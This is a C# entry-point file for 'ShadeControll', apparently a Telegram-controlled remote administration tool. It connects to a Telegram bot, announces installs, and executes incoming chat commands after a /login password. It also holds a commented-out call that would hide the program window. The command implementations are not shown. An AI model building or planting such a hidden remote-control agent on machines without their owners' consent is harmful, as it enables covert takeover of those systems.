using System;
using System.Threading;
using System.Collections.Generic;
using ShadeControll.Commands;
using Salaros.Configuration;
using System.IO;
using System.Globalization;

namespace ShadeControll
{
    class Program
    {
        public static TelegramClient telegramClient;
        public static ConfigParser configFile;
        public static Loger loger;
        public static readonly string configFileName = "config.cfg";
        public static bool IsLogged = false;
        static void Main()
        {
            // Preparing
            //Ninja.Hide();

            #region Initation
            configFile = GetConfig(configFileName);
            loger = new Loger(configFile.GetValue("directories", "logs"));
            telegramClient = new TelegramClient(configFile.GetValue("info","key"));
            #endregion

            #region Connecting
            while(!telegramClient.Connect())  {  Thread.Sleep(1000);  }
            #endregion

            #region First Run
            if (configFile.GetValue("info","first_run") == "true")
            {
                telegramClient.SendMessage("The instalation or update was successful 🤩 /version");
                configFile.SetValue("info", "first_run", "false");
                configFile.Save(configFileName);
            }
            else
            {
                telegramClient.SendMessage("ShadeControll is Running");
            }
            #endregion

            telegramClient.NewMessage += Client_NewMessage;
            while (true) { Thread.Sleep(1000); }
        }

        #region Telegram Listener
        private static void Client_NewMessage(string message)
        {
            loger.Log("<<" + message + Environment.NewLine);
            Cmd _cmd = new Cmd(message);
            foreach (Command cmd in Command.AvailableCommands)
            {
                if (cmd.CommandPrompt == _cmd.CommandPrompt) 
                { 
                    if(IsLogged)
                    {
                        cmd.Execute(_cmd.Args);
                    }
                    else
                    {
                        if (_cmd.CommandPrompt == "/login")
                        {
                            cmd.Execute(_cmd.Args);
                        }
                        else
                        {
                            telegramClient.SendMessage("Please use command /login [password] to get accesss");
                        }

                    }
                }
            }   
        }
        #endregion

        // Prepare Config File
        private static ConfigParser GetConfig(string file)
        {
            if(File.Exists(file))
            {
                return new ConfigParser(file);
            }
            else
            {
                File.WriteAllText(configFileName, ConfigFile.Default);
                return new ConfigParser(ConfigFile.Default, new ConfigParserSettings {
                    MultiLineValues = MultiLineValues.Simple | MultiLineValues.AllowValuelessKeys | MultiLineValues.QuoteDelimitedValues,
                    Culture = new CultureInfo("en-US")
                });
            }
        }
    }
}
